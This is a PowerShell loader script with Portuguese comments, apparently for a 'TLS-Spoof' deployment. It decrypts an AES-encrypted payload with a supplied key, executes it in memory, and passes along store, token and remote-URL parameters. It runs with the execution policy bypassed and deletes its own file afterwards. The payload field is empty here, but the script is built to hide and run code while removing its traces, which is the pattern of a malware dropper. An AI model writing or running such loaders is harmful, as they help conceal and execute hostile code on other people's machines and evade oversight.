# loader.ps1 - Decripta e roda o deploy TLS-Spoof (AES-256, chave via parametro)
# USO: powershell -NoP -EP Bypass -File loader.ps1 -Key "CHAVE" [-Loja X -Token Y -Reverse -Watch -DetectOnly]
param(
    [string]$Key = "",
    [string]$Loja = "",
    [string]$Token = "",
    [string]$LocalDir = "",
    [string]$BaseUrl = "https://raw.githubusercontent.com/salexunic/tls/main",
    [switch]$Reverse,
    [switch]$DetectOnly,
    [switch]$Force,
    [switch]$Watch,
    [switch]$Once
)

$ErrorActionPreference = "Stop"

if (-not $Key) {
    Write-Host "[ERRO] Chave obrigatoria: -Key" -ForegroundColor Red
    exit 1
}

$payloadB64 = ""

function Decrypt-Script {
    param([string]$B64, [string]$K)
    $keyBytes = [Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($K))
    $raw = [Convert]::FromBase64String($B64)
    $iv = New-Object byte[] 16
    [Array]::Copy($raw, 0, $iv, 0, 16)
    $cipher = New-Object byte[] ($raw.Length - 16)
    [Array]::Copy($raw, 16, $cipher, 0, $cipher.Length)
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.Key = $keyBytes
    $aes.Mode = [Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [Security.Cryptography.PaddingMode]::PKCS7
    $aes.IV = $iv
    $dec = $aes.CreateDecryptor()
    $out = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
    $aes.Dispose()
    return [Text.Encoding]::UTF8.GetString($out)
}

try {
    $script = Decrypt-Script -B64 $payloadB64 -K $Key
} catch {
    Write-Host "[ERRO] Chave incorreta ou payload corrompido." -ForegroundColor Red
    exit 1
}

# Passa tudo adiante pro script descriptografado
$p = @{}
if ($Loja)       { $p.Loja       = $Loja }
if ($Token)      { $p.Token      = $Token }
if ($LocalDir)   { $p.LocalDir   = $LocalDir }
if ($BaseUrl)    { $p.BaseUrl    = $BaseUrl }
if ($Reverse)    { $p.Reverse    = $true }
if ($DetectOnly) { $p.DetectOnly = $true }
if ($Force)      { $p.Force      = $true }
if ($Watch)      { $p.Watch      = $true }
if ($Once)       { $p.Once       = $true }

& ([scriptblock]::Create($script)) @p

# Self-delete (so se rodou de arquivo baixado/temp)
if ($PSCommandPath) {
    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
}